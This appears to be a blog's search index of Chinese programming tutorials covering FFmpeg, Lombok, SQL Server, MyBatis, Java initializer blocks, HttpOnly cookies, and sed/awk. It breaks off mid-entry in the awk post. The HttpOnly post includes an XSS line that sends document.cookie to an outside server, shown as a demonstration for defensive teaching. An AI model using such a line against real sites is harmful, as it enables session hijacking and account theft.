<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[初探FFmpeg命令行]]></title>
    <url>%2Fposts%2Flearn_FFmpeg_command_tool.html</url>
    <content type="text"><![CDATA[前言微博上很火的sorry表情包程序, 看到有Java程序, 于是扒了下来看源码。看是怎么实现的, 原来是生成ass字幕文件, 然后用FFmpeg命令加入视频。 介绍FFmpeg是用于录制、转换和流化音频和视频的完整解决方案。官网地址、GitHub地址 安装教程 官网安装教程 如何在CentOS上安装FFmpeg ffmpeg -h帮助在命令行输入ffmpeg -h可以看到帮助命令。这里只显示常用的帮助命令。123456789101112131415161718192021222324252627282930313233343536373839404142用法: ffmpeg [options] [[infile options] -i infile]... &#123;[outfile options] outfile&#125;...获取帮助: -h -- 打印基本帮助命令 -h long -- 打印更多帮助命令 -h full -- 打印所有帮助命令 (包括所有格式和编解码器特定的选项, 很长) 有关选项的详细说明, 请参阅man ffmpeg.打印帮助 / 信息 / 功能:-L 显示license许可证-version 显示版本-formats 显示可用的格式-codecs 显示可用的编码器、解码器全局选项（影响整个程序而不是仅仅一个文件:-v loglevel 设置日志输出等级-report generate a report-y 覆盖输出文件-n 不覆盖输出文件每个文件的主要选项:-f fmt 指定输出格式-t duration 录制或转码音频/视频的“持续时间”, 以秒为单位-to time_stop 录制或转码音频/视频的“截止时间”, 以秒为单位-ss time_off 录制或转码音频/视频的“开始时间”, 以秒为单位, 也支持[-]hh:mm:ss[.xxx]的时间格式视频选项:-vframes number 设置要输出的视频帧的数量-r rate 设置帧率(Hz值，分数或缩写)-s size 设置帧分辨率(如1280x720)-aspect aspect 设置纵横比 (4:3, 16:9 或 1.3333, 1.7777)-vn 禁用视频, 用于只输出音频文件-vf filter_graph 设置视频过滤器-ab bitrate 指定音频比特率(单位kbit/s), 如-b:a 320-b bitrate 指定视频比特率(单位kbit/s), 如-b:v 64音频选项:-ar rate 设置音频采样率(以Hz为单位)-an 禁用音频, 用于只输出视频字幕选项:-sn 禁用字幕 FFmpeg过滤器ffmpeg目录下, 有个文件夹叫libavfilter, 它可以单独编译为一个库。用于音视频过滤。相当于一个特效之类的东西。官方文档 使用示例 显示媒体文件详细信息 1ffmpeg -i input.mp4 将视频文件转换为不同的格式 1ffmpeg -i input.mp4 output.avi 将视频文件转换为音频文件 1ffmpeg -i input.mp4 -vn -ar 44100 -ac 2 -ab 320 -f mp3 output.mp3 更改视频文件的分辨率 12ffmpeg -i input.mp4 -s 1280x720 -c:a copy output.mp4 ffmpeg -i input.mp4 -filter:v scale=640:480 -c:a copy output.mp4 压缩 1234# 压缩视频文件ffmpeg -i input.mp4 -vf scale=1280:-1 -c:v libx264 -preset veryslow -crf 24 output.mp4 # 压缩音频文件ffmpeg -i input.mp3 -ab 128 output.mp3 删除音频、视频 1234# 删除视频ffmpeg -i input.mp4 -vn output.mp3# 删除音频ffmpeg -i input.mp4 -an output.mp4 截取图片 12# 截取1帧图片保存为image-01.png的格式ffmpeg -i input.mp4 -r 1 -f image2 image-%2d.png 裁剪视频 123456# 从位置(10,20)开始裁剪300×400的部分ffmpeg -i input.mp4 -filter:v "crop=10:20:300:400" output.mp4 # 将第10秒开始的50秒视频转为avi格式, 可以用hh.mm.ss格式ffmpeg -i input.mp4 -ss 10 -t 50 output.avi # 将纵横比改为16:9ffmpeg -i input.mp4 -aspect 16:9 output.mp4 添加字幕到视频文件 1ffmpeg -i input.mp4 -i subtitle.srt -map 0 -map 1 -c copy -c:v libx264 -crf 23 -preset veryfast output.mp4 添加字幕并转为gif 1ffmpeg -i input.mp4 -r 6 -vf ass=videoAss.ass,scale=300:-1 -y output.gif 参考资料 在线制作sorry 为所欲为的gif 20 FFmpeg初学者命令 FFMPEG使用参数详解 ffmpeg filter过滤器 基础实例及全面解析]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>FFmpeg</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初探Lombok并拒绝它]]></title>
    <url>%2Fposts%2Flearn_Lombok_and_reject_it.html</url>
    <content type="text"><![CDATA[前言在一个GitHub项目发现它使用了Lombok这个工具。没见过所以了解一下, 但是发现还是不太好用, 于是摒弃之。但好歹记录一下。 介绍Lombok是一个可以大量减少代码的工具, 通过Pluggable Annotation Processing API的方式解析注解, 在编译期为class文件注入getter或setter或toString等等诸如此类的代码。 准备工作 开发工具IDEA 在IDEA中安装Lombok Plugin插件 导入org.projectlombok.lombok 示例Lombok通过注解生效, 官方注解列表12345678910111213@Getter@Setterpublic class User&#123; private Long id; private String name;&#125;public class MyTest() &#123; public static void main(String[] args) &#123; User user = new User(); System.out.println("自动生成的方法:" + user.getId() + "," + user.getName()); &#125;&#125; 为什么摒弃它 Lombok具有太强的侵入性 失去了封装的意义 具有太强的侵入性我在第一次接触到到带有Lombok项目的时候, 编译报错, 虽然我导入了Lombok的maven地址, 但是仍然提示找不到getter方法。点进去一看, 发现根本没有getter方法, 只有一个@Getter注解。 也就是说, 一旦你使用了Lombok, 所有编译你代码的人都必须使用Lombok编译, 传染性、侵入性太强 失去了封装的意义更重要的是, 面向对象。如果我们只是不想写getter和setter方法, 不如就直接将field设置成public。长久的写重复的getter和setter方法已经让人不知道为什么要这样写, 只知道大家都是这样写, 以前都是这样写, 所以这样写。12345678910public void setName(String name) &#123; this.name = name;&#125;public void setName(String name) &#123; switch(name) &#123; case "admin": this.name = "I am admin:"+name; break; case "user" : this.name = "I am user:" +name; break; &#125;&#125; 第二个setter方法, 封装了逻辑操作, 和第一个方法不同, 这就是setter方法的意义。]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>Lombok</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLServer的PARTITION_BY进行分区查询]]></title>
    <url>%2Fposts%2Fuse_PARTITION_BY_to_query.html</url>
    <content type="text"><![CDATA[前言假设有一个用户表admin(id, name, sex), 现在有个需求。是按照性别sex进行分区, 然后排序。 比如有以下数据123456id name sex(1男2女)1 admin1 12 admin2 13 admin3 24 admin4 25 admin5 2 要求查询性别sex进行分区, 然后排序。123456id name sex(1男2女) row_num1 admin1 1 12 admin2 1 23 admin3 2 14 admin4 2 25 admin5 2 3 使用ROW_NUMBER进行排序首先获取行数, SQLServer提供了ROW_NUMBER函数。123select tmp.*, ROW_NUMBER() over(order by tmp.id asc) as row_numfrom ( select id, name, sex from admin ) tmporder by row_num asc 123456id name sex(1男2女) row_num1 admin1 1 12 admin2 1 23 admin3 2 34 admin4 2 45 admin5 2 5 但是需求是, 根据sex分区排序, 所以添加一个partition by关键字。 使用PARTITION BY进行分区123select tmp.*, ROW_NUMBER() over(partition by sex order by tmp.id asc) as row_numfrom ( select id, name, sex from admin ) tmporder by sex asc, row_num asc 123456id name sex(1男2女) row_num1 admin1 1 12 admin2 1 23 admin3 2 14 admin4 2 25 admin5 2 3 完成, 此外还可以用来做分区求和等功能。 参考资料 sum over partition by 的用法]]></content>
      <categories>
        <category>SQL Server</category>
      </categories>
      <tags>
        <tag>SQL Server</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从Response读取XML字符串进行解析]]></title>
    <url>%2Fposts%2Fread_XML_string_from_Response_for_parsing.html</url>
    <content type="text"><![CDATA[前言调用WebService接口返回了XML的数据, 需要解析并封装为一个AjaxDto(status, msg, obj)对象。项目中已经依赖了Apache的commons-configuration, 所以就直接拿来用了。 样例响应体1234567&lt;?xml version="1.0" encoding="GBK" ?&gt; &lt;response&gt; &lt;head&gt; &lt;code&gt;integer&lt;/code&gt; &lt;message&gt;String&lt;/message&gt; &lt;/head&gt;&lt;/response&gt; 解析代码123456789101112131415161718192021222324252627282930313233343536373839404142public class XmlParser &#123; private static final Logger logger = LoggerFactory.getLogger(XmlParser.class); public static void main(String[] args) throws Exception &#123; String xml = "&lt;?xml version=\"1.0\" encoding=\"GBK\" ?&gt; \n" + "&lt;response&gt;\n" + "&lt;head&gt;\n" + "&lt;code&gt;integer&lt;/code&gt;\n" + "&lt;message&gt;String&lt;/message&gt;\n" + "&lt;/head&gt;\n" + "&lt;/response&gt;\n"; XmlParser parser = XmlParser.init(xml); if(parser == null)&#123; logger.error("创建失败"); return; &#125; System.out.println(parser.getString("head.code")); &#125; private XMLConfiguration config; public static XmlParser init(String xml) &#123; // 1. 字符串转为输入流 try (InputStream in = new ByteArrayInputStream(xml.getBytes());) &#123; XmlParser parser = new XmlParser(in); return parser; &#125; catch (IOException | ConfigurationException e) &#123; logger.error("加载xml错误", e); &#125; return null; &#125; private XmlParser(InputStream in) throws ConfigurationException &#123; // 2. 读取输入流数据 config = new XMLConfiguration(); config.load(in); &#125; // 3. 获取节点数据 public String getString(String xpath)&#123; return config.getString(xpath); &#125;&#125; 坑注意以下代码12System.out.println(parser.getString("response.head.code"));System.out.println(parser.getString("head.code")); 我第一次使用的时候, 是使用第一行response.head.code代码的, 但是获取失败。改成第二行head.code代码就行了。后来想了下原因, response是根节点, 根节点有且只有一个。所以也就不需要特意去指定了。]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[被忽视的初始化块]]></title>
    <url>%2Fposts%2FIgnored_initialization_block.html</url>
    <content type="text"><![CDATA[前言从学过初始化块之后, 就一直没用到, 今天学习Mybatis, 居然有一处语法没看懂。特此记录一下。123456789public class PrivilegeProvider &#123; public String selectById(final Long id)&#123; return new SQL()&#123; &#123; SELECT("id, privilege_name, privilege_url"); &#125; &#125;.toString(); &#125;&#125; 初始化块这可不是Lambda表达式, 因为环境是JDK 1.7。而是初始化块。我们自己创建个例子。123456789101112131415161718192021222324252627282930313233343536public class MyList&lt;E&gt; &#123; private ArrayList&lt;E&gt; list = new ArrayList&lt;&gt;(); // 链式编程, 返回this public MyList&lt;E&gt; add(E e) &#123; list.add(e); return this; &#125;&#125;public class MyTest &#123; @Test public void test1() &#123; MyList&lt;String&gt; list = new MyList&lt;String&gt;() &#123; // 初始化块 &#123; add("test1"); add("test2"); for (int i = 3; i &lt; 5; i++) &#123; add("test3"); &#125; &#125; &#125;; Assert.assertEquals(4, list.list.size()); &#125; @Test public void test2() &#123; MyList&lt;String&gt; list = new MyList&lt;String&gt;() .add("test1") .add("test2"); for (int i = 3; i &lt; 5; i++) &#123; list.add("test3"); &#125; Assert.assertEquals(4, list.list.size()); &#125;&#125; 看test1方法, 是不是和上面的很熟悉, 其实就是使用了初始化块, 进行初始化。和下面test2方法是等价的。 而且也不会产生匿名内部类, 对于某些需要参数进行初始化, 而不得不将其设计为抽象类的类, 是一种很好的代码优化手段。]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HttpOnly详解]]></title>
    <url>%2Fposts%2FWhat_is_HttpOnly.html</url>
    <content type="text"><![CDATA[前言Http连接是无状态的, 也就是说, 即使你发送第一次Http请求, 传了个param参数给Web服务器。第二次Http请求想获取param参数, 是获取不到的, 因为Web服务器是不认识你的。为了完成这个需求, 我们可以使用Cookie和Session进行存储数据, 在Cookie中存入本次会话的SessionID, 那Web服务器从Cookie中获取SessionID就可以知道你是哪个用户, 知道你之前存了什么数据。 危险我们知道Cookie是明文存储的, 甚至就算是小白用户, 也可以通过浏览器直接查看。那么如果小明知道了小红的Cookie里的用户凭证, 然后将自己的Cookie的用户凭证改为小红的用户凭证, 那不就可以看到小红的信息了? HttpOnly比如我自己搭建一个服务器http://localhost:8080, 然后在要窃取Cookie页面按下F12打开Console控制台执行下面代码(XSS攻击) 1window.open('http://localhost:8080?c='+document.cookie); 就可以将Cookie发送到我们自己的服务器。 那么, 只要不让document获取到敏感Cookie就好了。为Cookie设置HttpOnly, 禁止js获取。 1234567@RequestMapping("/test")public String test(HttpServletResponse response)&#123; Cookie cookie = new Cookie("key1", "value1"); cookie.setHttpOnly(true); // 设置HttpOnly response.addCookie(cookie); return "test.jsp"&#125; 参考资料 关于cookie的安全性问题]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>Cookie</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis回写主键的值]]></title>
    <url>%2Fposts%2Fhow_to_get_primary_key_in_Mybatis.html</url>
    <content type="text"><![CDATA[前言每种数据库都有自己的主键生成方式，比如MySQL支持自增的主键, 在插入数据后自动生成主键, 比如Oracle通过序列的方式, 在插入数据之前生成主键, 再写去表中。 环境准备12345678910111213141516171819202122232425262728public interface UserMapper &#123; int insert(User User);&#125;public class User &#123; Long id; String name; // 省略构造函数和getter setter方法&#125;public class MyTest &#123; @Test public void testInsert() throws IOException &#123; // 1. 初始化 SqlSession Reader reader = Resources.getResourceAsReader("mybatis-config.xml"); SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader); try(SqlSession sqlSession = factory.openSession())&#123; // 2. 获取Mapper UserMapper userMapper = sqlSession.getMapper(UserMapper.class); User user = new User(); user.setName("测试用户"); System.out.println(user); int result = userMapper.insert(user); Assert.assertEquals(1, result); // 3. 判断主键回写成功 Assert.assertNotNull(user.getId()); System.out.println(user); &#125; &#125;&#125; 使用JDBC的useGeneratedKeys获取主键值只支持插入数据后生成主键的数据库。如MySQL和SQLServer。底层是使用了JDBC的statement.getGeneratedKeys()。 1234567&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd" &gt;&lt;mapper namespace="com.ahao.demo.mapper.UserMapper"&gt; &lt;insert id="insert" useGeneratedKeys="true" keyProperty="id"&gt; insert sys_user(id, name) values (#&#123;id&#125;, #&#123;name&#125;) &lt;/insert&gt;&lt;/mapper&gt; 使用selectKey获取主键值useGeneratedKeys局限于主键自增的数据库, 不支持Oracle这种先生成主键, 再把主键插入数据库中的形式。selectKey两者都支持, 缺点就是比较笨重, 需要写多一点xml代码。 12345678910&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd" &gt;&lt;mapper namespace="com.ahao.demo.mapper.UserMapper"&gt; &lt;insert id="insert"&gt; &lt;selectKey keyProperty="id" keyColumn="id" resultType="Long" order="AFTER"&gt; select LAST_INSERT_ID() &lt;/selectKey&gt; insert sys_user(id, name) values (#&#123;id&#125;, #&#123;name&#125;) &lt;/insert&gt;&lt;/mapper&gt; keyProperty指的是实体的field名称, keyColumn指的是数据表的column名称, resultType指定返回的Java类型。order分为AFTER和BEFORE, 因为MySQL中, 主键是在插入数据之后生成的, 所以选择AFTER。Oracle则要选Before。需要注意的是, selectKey的位置不会影响结果, 最好是根据实际情况来选择放置位置, 比如MySQL就放在SQL之前, 表示先生成主键后插入数据。 各数据库回写主键的SQL MySQL： SELECT LAST_INSERT_ID() Sql Server：SELECT SCOPE_IDENTITY() Oracle：SELECT SEQ_ID.nextval from dual Db2： VALUES IDENTITY_VAL_LOCAL() HSQLDB：CALL IDENTITY()]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis文件位置引发的mappedStatements为空]]></title>
    <url>%2Fposts%2FMybatis_mapper_xml_location_causes_mappedStatements_is_empty.html</url>
    <content type="text"><![CDATA[前言在不使用Spring进行初始化Bean, 单纯的使用Mybatis的时候, 遇到xml读取不到的问题。 准备环境 12345678910111213141516171819202122232425262728293031&lt;!--pom.xml --&gt;&lt;dependencies&gt; &lt;!--==============================日志============================--&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;1.7.25&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;version&gt;1.2.3&lt;/version&gt; &lt;/dependency&gt; &lt;!--==============================日志============================--&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.4.6&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.45&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 12345678-- MySQL数据库create database test;use test;create table user( id int primary key auto_increment, name varchar(50));insert into user(name) values ('A'), ('B'), ('C'); 12345678910111213141516171819202122232425262728293031&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- mybatis-config.xml --&gt;&lt;!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;&lt;configuration&gt; &lt;settings&gt; &lt;setting name="logImpl" value="SLF4J"/&gt; &lt;/settings&gt; &lt;environments default="development"&gt; &lt;environment id="development"&gt; &lt;transactionManager type="JDBC"&gt; &lt;!-- 配置数据库 --&gt; &lt;/transactionManager&gt; &lt;dataSource type="UNPOOLED"&gt; &lt;property name="driver" value="com.mysql.jdbc.Driver"/&gt; &lt;property name="url" value="jdbc:mysql://localhost:3306/test"/&gt; &lt;property name="username" value="root"/&gt; &lt;property name="password" value="root"/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;mappers&gt; &lt;!-- 注册mapper的三种方式 --&gt; &lt;package name="com.ahao.demo.mapper"/&gt; &lt;!--&lt;mapper resource="UserMapper.xml"/&gt;--&gt; &lt;!--&lt;mapper class="com.ahao.demo.mapper.UserMapper"/&gt;--&gt; &lt;/mappers&gt;&lt;/configuration&gt; 123456789&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!-- UserMapper.xml --&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;!-- namespace命名空间,作用就是对sql进行分类化管理,理解sql隔离 注意:使用mapper代理方法开发,namespace有特殊重要的作用,namespace等于mapper接口地址 --&gt;&lt;mapper namespace="com.ahao.demo.mapper.UserMapper"&gt; &lt;select id="selectAll" resultType="Map"&gt; select * from user &lt;/select&gt;&lt;/mapper&gt; 12345package com.ahao.demo.mapper;import java.util.*;public interface UserMapper &#123; List&lt;Map&lt;String, String&gt;&gt; selectAll();&#125; 12345678910111213141516171819202122232425262728293031323334353637383940package com.ahao.test;import com.ahao.demo.mapper.UserMapper;import org.apache.ibatis.io.Resources;import org.apache.ibatis.session.SqlSession;import org.apache.ibatis.session.SqlSessionFactory;import org.apache.ibatis.session.SqlSessionFactoryBuilder;import org.junit.BeforeClass;import org.junit.Test;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import java.io.IOException;import java.io.Reader;import java.util.List;public class MyTest &#123; private static final Logger logger = LoggerFactory.getLogger(MyTest.class); private static SqlSessionFactory sqlSessionFactory; // 1. 从 mybatis-config.xml 初始化 sqlSessionFactory @BeforeClass public static void init() throws IOException &#123; Reader reader = Resources.getResourceAsReader("mybatis-config.xml"); sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader); reader.close(); &#125; @Test public void testSelectAll()&#123; // 2. 读取并显示 try(SqlSession sqlSession = sqlSessionFactory.openSession()) &#123; UserMapper userMapper = sqlSession.getMapper(UserMapper.class); System.out.println(userMapper); List user = userMapper.selectAll(); System.out.println(user); &#125; &#125;&#125; 分析运行过后抛出一个异常, statement没有找到。1org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.ahao.demo.mapper.UserMapper.selectAll 通过debug看到sqlSessionFactory对象中的Configuration内有两个属性，mapperRegistry和mappedStatements看起来是存储mapper类和对应的Statements的两个属性。mapperRegistry注册成功了, 但是mappedStatements为空, 也就是Class加载成功了, xml加载失败。 xml自动扫描配置是包扫描, 那么切换成别的可行吗?12345678&lt;mappers&gt; &lt;!-- Invalid bound statement (not found) --&gt; &lt;package name="com.ahao.demo.mapper"/&gt; &lt;!-- 加载成功 --&gt; &lt;mapper resource="UserMapper.xml"/&gt; &lt;!-- Invalid bound statement (not found) --&gt; &lt;mapper class="com.ahao.demo.mapper.UserMapper"/&gt;&lt;/mappers&gt; 可以看到只有直接指定xml才能加载成功。那就是通过Class自动去寻找对应xml的时候发生了异常。翻阅了官方文档, 并没有相关资料。 解决方案然后检查target文件夹的时候, 发现UserMapper.xml和UserMapper.class没有在同一个文件夹内, 于是将target下的UserMapper.xml拖到UserMapper.class同级目录。调试发现mappedStatements有数据。成功了, 推测应该是通过包名转文件路径进行扫描的。 经过测试, 有两种解决方案 手动移动target文件夹内的mapper.xml到对应的mapper.class相同文件夹/WEB-INF/class/com/ahao/demo/mapper下。 将mapper.xml放在resource文件夹内, 对应的文件目录结构/resource/com/ahao/demo/mapper下。 总结Mybatis太坑, 没有个file not found提示。在IDEA下, 就算一开始将mapper.xml文件放在src/java文件夹下, 编译后也不会将xml放到target的相同目录下。不过有Spring就不用担心了, Spring可以指定扫描xml文件位置。实际开发一般都是和Spring整合的吧。]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux之sed流文本编辑器]]></title>
    <url>%2Fposts%2Fsed_of_Linux.html</url>
    <content type="text"><![CDATA[前言stream editor是Unix的行处理命令, 以行为单位, 依次读入文本的每行进行处理。sed一般不会对原文件进行操作, 当然, 有例外。12# 复制测试文件[root@localhost ~]# cp /etc/passwd /tmp/passwd 打印内容p参数: 前面接数字或正则表达式, 打印匹配内容-n参数: 不自动打印内容, 如果不和p一起使用, 则会输出两次相同内容!参数: 对之前的参数进行取反a~b参数: 从a行开始, 每隔b行执行操作12345678910111213141516# 1. 打印所有行[root@localhost ~]# nl /tmp/passwd | sed -n 'p'# 2. 打印所有行, 不使用 -n 会打印两次[root@localhost ~]# nl /tmp/passwd | sed 'p'# 3. 打印第2行[root@localhost ~]# nl /tmp/passwd | sed -n '2p'# 4. 打印匹配正则表达式为 root 的一行[root@localhost ~]# nl /tmp/passwd | sed -n '/root/p'# 5. 打印第2-10行的内容[root@localhost ~]# nl /tmp/passwd | sed -n '2,10p'# 6. 打印匹配正则表达式为 root 和 ahao 之间的行的内容[root@localhost ~]# nl /tmp/passwd | sed -n '/root/,/ahao/p'# 7. 打印除了第2-10行的所有行内容[root@localhost ~]# nl /tmp/passwd | sed -n '2,10!p'# 8. 打印第2行开始, 每3行的所有行内容[root@localhost ~]# nl /tmp/passwd | sed -n '2~3p' 增删(不影响原文件)na string参数: 表示在第n行后面追加(append)一行stringni string参数: 表示在第n行前面插入(insert)一行stringnd参数: 将第n行或匹配正则表达式n的一行删除(delete)1234567891011121314# 1. 在第5行后面追加(append)一行内容[root@localhost ~]# nl /tmp/passwd | sed '5a HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH'# 2. 在第2-5行每行后面追加(append)一行内容[root@localhost ~]# nl /tmp/passwd | sed '2,5a HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH'# 3. 在第5行前面插入(insert)一行内容[root@localhost ~]# nl /tmp/passwd | sed '5i HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH'# 4. 在第2-5行每行前面插入(insert)一行内容[root@localhost ~]# nl /tmp/passwd | sed '2,5i HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH'# 5. 将第2-5行的内容删除(delete)[root@localhost ~]# nl /tmp/passwd | sed '2,5d'# 6. 将匹配正则表达式 root 的行内容删除(delete)[root@localhost ~]# nl /tmp/passwd | sed '/root/d' 替换(不影响原文件)nc string参数: 将第n行替换(replace)为strings/regexp/replacement/参数: 将每行第一个匹配regexp正则表达式的替换为replacements/regexp/replacement/g参数: 将每行所有匹配regexp正则表达式的替换为replacements/regexp/str1 &amp; str2/g参数: &amp;参数表示正则表达式匹配的值s/regexp/\u&amp;/g参数: \u首字母大写, \U所有字母大写()参数: 括号捕获多个值, 用\1、\2等表示捕获的第几个值1234567891011121314151617181920# 1. 将第5行替换(replace)为指定字符串[root@localhost ~]# nl /tmp/passwd | sed '5c HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH'# 2. 将第2-5行替换(replace)为指定字符串[root@localhost ~]# nl /tmp/passwd | sed '2,5c HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH'# 3. 将每行第1个匹配正则表达式 : 的内容替换为 %[root@localhost ~]# nl /tmp/passwd | sed 's/:/%/'# 4. 将每行所有匹配正则表达式 : 的内容替换为 %, g 全局替换[root@localhost ~]# nl /tmp/passwd | sed 's/:/%/g'# 5. 将每行所有匹配正则表达式 : 的内容替换为 %包裹的字符串, &amp;表示匹配的字符串[root@localhost ~]# nl /tmp/passwd | sed 's/:/%&amp;%/g'# 6. 将匹配到的单词首字母转为大写, \u转为大写[root@localhost ~]# nl /tmp/passwd | sed 's/[a-z]*/\u&amp;/g'# 7. 将匹配到的单词所有字母转为大写, \U转为大写[root@localhost ~]# nl /tmp/passwd | sed 's/[a-z]*/\U&amp;/g'# 8. 使用()获取用户名, UID, GID, -r 不用加转义符[root@localhost ~]# cat /tmp/passwd | sed 's/^\([a-z_-]\+\):x:\([0-9]\+\):\([0-9]\+\):.*$/USER:\1 UID:\2 GID:\3/'[root@localhost ~]# cat /tmp/passwd | sed -r 's/^([a-z_-]+):x:([0-9]+):([0-9]+):.*$/USER:\1 UID:\2 GID:\3/' 退出q参数: 退出sed命令1234# 1. 到第3行就退出(quit)sed[root@localhost ~]# nl /tmp/passwd | sed '3q'# 2. 找到匹配 root 正则就退出(quit)sed[root@localhost ~]# nl /tmp/passwd | sed '/root/q' 读写原文件(修改原文件)12345678# 1. 创建一个文件[root@localhost ~]# echo -e '123\n456\n789' &gt; hello.txt# 2. 将/tmp/passwd插入 读入(read)的hello.txt文件的第1行后面打印输出, 不修改hello.txt[root@localhost ~]# sed '1r /tmp/passwd' hello.txt# 3. 将 hello.txt 写入(write)覆盖 /tmp/passwd, 修改/tmp/passwd[root@localhost ~]# sed 'w /tmp/passwd' # 4. 将 hello.txt 的第2行写入(write)覆盖 /tmp/passwd[root@localhost ~]# sed '2w /tmp/passwd' hello.txt]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux之awk流文本编辑器]]></title>
    <url>%2Fposts%2Fawk_of_Linux.html</url>
    <content type="text"><![CDATA[前言awk是Unix的行处理命令, 以行为单位, 依次读入文本的每行进行切片处理。12# 复制测试文件[root@localhost ~]# cp /etc/passwd /tmp/passwd 使用格式1awk [option] &apos;[BEGIN&#123;awk 操作命令&#125;]pattern&#123;awk 操作命令&#125;[END&#123;awk 操作命令&#125;]&apos; file(s) BEGIN{awk 操作命令}: 可选的, 前置操作, 在执行pattern循环之前执行。END{awk 操作命令}: 可选的, 后置操作, 在执行pattern循环之后执行。pattern{awk 操作命令}: 必选的, 对每行进行处理。awk 操作命令: 包括函数调用printf(), 控制指令if else等。 切片处理所谓的切片处理, 举个例子就是a:b:c, 可以将:作为分隔符, 划分为3个片段。 -F separator选项: 指定separator作为分隔符, 默认为空格$n变量: $0表示当前行的内容, $n表示当前行内, 以上面的separator分割的第n个片段NR变量: 每行的行号, The total number of input records seen so far.NF变量: 分割的片段的数量, The number of fields in the current input record.FILENAME变量: 正在处理的文件名 12345678910# 1. 获取以 : 作为分隔符, 第3个片段, 即UIDawk -F ':' '&#123;print $3&#125;' /tmp/passwd# 2. 获取以 : 作为分隔符, 第1和3个片段, 即用户名和UIDawk -F ':' '&#123;print $1,$3&#125;' /tmp/passwdawk -F ':' '&#123;print $1" "$3&#125;' /tmp/passwdawk -F ':' '&#123;print "USER:"$1"\tUID:"$3&#125;' /tmp/passwd# 3. 输出每行的行号NR和片段数NFawk -F ':' '&#123;print NR"\t"NF"\tUSER:"$1"\tUID:"$3&#125;' /tmp/passwd# 4. 输出处理的文件名awk -F ':' '&#123;print FILENAME"\tUSER:"$1"\tUID:"$3&#125;' /tmp/passwd patternpattern是每行前的一个匹配表达式。分为两种。 ~, !~: 匹配正则表达式 ==, !=, &lt;, &gt;: 判断逻辑表达式 1234567891011121314# 1. 打印出匹配root的每行行号和内容awk -F ':' '/root/&#123;print NR"\t"$0&#125;' /tmp/passwd# 2. 打印出UID为1开头的每行行号和UID和用户名awk -F ':' '$3~/^1.*/&#123;print NR"\t"$3"\t"$1&#125;' /tmp/passwd# 3. 打印出UID不为1开头的每行行号和UID和用户名awk -F ':' '$3!~/^1.*/&#123;print NR"\t"$3"\t"$1&#125;' /tmp/passwd# 1. 打印出UID大于100的行号和UID和用户名awk -F ':' '&#123;if($3&gt;100) print NR"\t"$3"\t"$1&#125;' /tmp/passwdawk -F ':' '$3&gt;100&#123;print NR"\t"$3"\t"$1&#125;' /tmp/passwd# 2. 打印出UID等于0的行号和UID和用户名awk -F ':' '$3==0&#123;print NR"\t"$3"\t"$1&#125;' /tmp/passwd# 3. 打印出UID不等于0的行号和UID和用户名awk -F ':' '$3!=0&#123;print NR"\t"$3"\t"$1&#125;' /tmp/passwd 函数调用123# 1. 